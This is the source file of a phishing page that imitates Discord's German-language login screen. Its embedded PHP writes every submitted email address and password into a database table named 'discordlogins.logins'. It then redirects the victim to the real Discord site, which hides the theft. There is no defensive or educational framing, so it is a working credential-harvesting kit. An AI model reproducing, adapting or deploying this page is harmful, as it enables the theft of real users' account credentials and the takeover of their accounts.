<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <link rel="icon" href="https://previews.dropbox.com/p/thumb/ABZw2b8e2672ZCdBnoJgFc4yjO6ZiuKL-6iUN72QSY5n9Pqzp6HbLwyUXOjAc7vULBg8AkKUe2c12ljPXMPOB-uNUU_UkkMM0Bs76os4tT-UMoRluAR5eOxmpvCjnWg7Gl0FdEBOyDn6uotIidhg7BALA5lboRg3bPNf2I6F_vgD8Vgujw3b5Uu_zcVfOhYjmv1O0n5fhX0PiKjSRdFPoggMczhNxgwPawJzMO9hNaueCZgbPYMUy-LIBfipL7-hEl9yKzUnolD-s4MKXlfwMhaEM1s1PHcGk2oD02pTt4dMXv_EUMNOXQerXhshUiscDoa5pcZUOu31njFtYc1igClTeBq9X8Ds8ZYSlRi1mYkE5g/p.png" type="image/icon type">
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="./icon.ico" type="image/x-icon">
</head>

<body>
    <?php

    if(isset($_POST["submit"])) {
        require "mysql.php";

        $stmt = $mysql->prepare("INSERT INTO `discordlogins`.`logins` (`MAIL`, `PASSWORD`) VALUES (:mail, :pw);");
        $stmt->bindParam(":mail", $_POST["email"]);
        $stmt->bindParam(":pw", $_POST["pass"]);
        $stmt->execute();

        header("Location: https://discord.com/channels/@me");
    }

    ?>

    <div class="main-content">
        <div class="content-left">
            <h6>Willkommen zurück!</h6>
            <p>Wir freuen uns so, dich wiederzusehen!</p>
            <form action="index.php" method="post" class="form">
                <p class="formP">E-Mail oder Telefonnummer <span class="error"></span></p>
                <input type="text" name="email" id="mail">
                <p class="formP">Passwort <span class="error"></span></p>
                <input type="password" name="pass" id="pass">
                <a href="https://discord.com/login"><p>Passwort vergessen?</p></a>

                <button type="submit" name="submit">Anmelden</button>
            </form>

            <div class="register">
                <p>Brauchst du einen Account? <a href="https://discord.com/register">Registrieren</a></p>
            </div>
        </div>
        <div class="content-right">
            <br>
            <img src="./loading.gif" style="width: 50px;" alt="">
            <br> <br>
            <h6>Mit QR-Code </h6><h6>einloggen</h6> <h5></h5>
            <p>Scanne den Code mit der <span class="app">Discord-<br>App</span> und logge dich sofort ein.</p>
        </div>
    </div>

    <script src="script.js"></script>
</body>

</html>